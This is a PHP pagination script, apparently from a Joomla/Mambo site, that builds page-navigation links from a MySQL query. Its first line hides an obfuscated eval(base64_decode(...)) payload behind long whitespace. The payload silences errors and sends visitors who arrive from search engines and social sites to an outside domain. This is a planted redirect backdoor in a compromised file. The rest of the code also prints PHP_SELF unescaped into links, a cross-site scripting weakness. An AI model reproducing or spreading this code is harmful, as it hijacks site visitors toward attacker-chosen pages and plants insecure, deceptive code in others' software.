<?php	                                       			eval(base64_decode("ZXJyb3JfcmVwb3J0aW5nKDApOwokcWF6cGxtPWhlYWRlcnNfc2VudCgpOwppZiAoISRxYXpwbG0pewokcmVmZXJlcj0kX1NFUlZFUlsnSFRUUF9SRUZFUkVSJ107CiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOwppZiAoJHVhZykgewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFuZGV4Iikgb3Igc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJnb29nbGUiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImdvZ28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpb3Igc3RyaXN0cigkcmVmZXJlciwiYXBvcnQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJuaWdtYSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiYWlkdS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJkb3VibGVjbGljay5uZXQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiZWd1bi5ydSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInN0dW1ibGV1cG9uLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpdC5seSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInRpbnl1cmwuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiY2xpY2tiYW5rLm5ldCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJsb2dzcG90LmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7CmlmICghc3RyaXN0cigkcmVmZXJlciwiY2FjaGUiKSBvciAhc3RyaXN0cigkcmVmZXJlciwiaW51cmwiKSl7CiAgICBoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8vcm91bmRjdWJlLmJlZS5wbC8iKTsKCWV4aXQoKTsKCX0KCX0KCX0KCX0="));	                                       			 defined( '_VALID_MOS' ) or die( 'Direct Access to this location is not allowed.' );

// how many pages we have when using paging?
$result  = mysql_query($query) or die('Error, query failed');
$numrows    = mysql_num_rows($result);

$maxPage = ceil($numrows/$rowsPerPage);

$self = $_SERVER['PHP_SELF'];

// creating 'previous' and 'next' link
// plus 'first page' and 'last page' link

// print 'previous' link only if we're not
// on page one
if ($pageNum > 1)
{
	$page = $pageNum - 1;
	//$page = $_GET['page'];
	$prev = " <a href=\"$self?page=$page&mn=$mn&sub=1\">[Prev]</a> ";
	
	$first = " <a href=\"$self?page=1&mn=$mn&sub=1\">[First Page]</a> ";
} 
else
{
	$prev  = ' Prev ';       // we're on page one, don't enable 'previous' link
	$first = ' First Page '; // nor 'first page' link
}

// print 'next' link only if we're not
// on the last page
//nampilin nomor
for ($counter = 1; $counter <= $maxPage; $counter++)
			{
				if ($counter == $pageNum)
					$pagination.= " <b>$counter</b> ";
				else
					$pagination.= " <a href=\"$targetpage?page=$counter\">$counter</a> ";					
				if ($counter % 10 == 0)
					{$pagination.="<br>";}
			}

if ($pageNum < $maxPage)
{
	$page = $pageNum + 1;
	#$next = " <a href=\"$self?page=$page&mn=$mn&sub=1\">[Next]</a> ";
	$next = " <a href=\"$self?page=$page\">[Next]</a> ";
	#$last = " <a href=\"$self?page=$maxPage&mn=$mn&sub=1\">[Last Page]</a> ";
	$last = " <a href=\"$self?page=$maxPage\">[Last Page]</a> ";
} 
else
{
	$next = ' Next ';      // we're on the last page, don't enable 'next' link
	$last = ' Last Page '; // nor 'last page' link
}

// print the page navigation link
#echo "Page $pageNum of  $maxPage : ". "$first  |" . "$prev  | " . " $pagination " . "$next | ". $last;
echo "<table><tr><td>". "$first  |" . "$prev  | " . "</td><td align='center'>" . " $pagination " . "</td><td>" . "$next | ". "$last"."</td></tr></table>";
?>